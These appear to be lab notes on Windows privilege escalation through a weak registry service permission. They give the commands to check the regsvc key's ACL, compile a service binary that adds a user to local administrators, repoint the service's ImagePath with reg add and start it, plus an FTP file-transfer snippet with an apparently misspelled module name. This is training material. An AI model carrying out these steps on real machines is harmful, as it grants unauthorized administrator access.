# Reg -Srvc

First Check if we have full control or not

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

We see that we are NT/Authority interactive and have full access to it ;And there is also admin group so by  abusing this we can add a new user to that group

Exploitation

Windows VM

‘C:\Users\User\Desktop\Tools\Source\windows\_service.c’ to the Kali VM

Kali VM

1\. Open windows\_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add\
2\. Exit the text editor and compile the file by typing the following in the command prompt

```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

Windows VM

1\. Place x.exe in ‘C:\Temp’.\
2\. Open command prompt at type:&#x20;

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`\
3\. In the command prompt type: `sc start regsvc`\
4\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

\---------------------------------------------------------------------------------------------------------------------

For the file transfer from windows to linux

kali

```
python2 -m pyftblib -p 21 --write
```

In Windows

```
ftp <kali ip> 
```

then anonymous login then&#x20;

```
put <file name>
```

